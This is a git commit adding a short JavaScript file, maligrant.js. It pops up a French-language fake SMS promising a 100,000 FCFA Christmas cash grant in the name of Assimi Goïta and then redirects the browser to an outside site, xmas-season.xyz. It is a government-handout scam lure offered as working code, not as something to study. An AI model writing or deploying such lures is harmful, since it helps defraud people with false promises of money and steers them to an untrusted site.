5dac0aebe2426851744671c6753dd4e4d967a7cd
bigetijazz14 <bigetijazz14@gmail.com>
2024-11-27 17:39:02 -0800

    Create maligrant.js

---
+++ maligrant.js
@@ -0,0 +1,6 @@
+
+var password = 'RECLAMER 100,000 FCFA'
+password=prompt('SMS: Félicitations, vous êtes admissible à ASSIMI GOÏTA 100,000 FCFA SUBVENTION EN ESPÈCES DE NOËL POUR TOUS, Veuillez appuyer sur OK pour RECLAMER Prix ​​en espèces','RECLAMER 100,000 FCFA');
+if (password != 'RECLAMER 100,000 FCFA') {
+location.href='https://www.xmas-season.xyz/100000FCFA-subvention';
+}
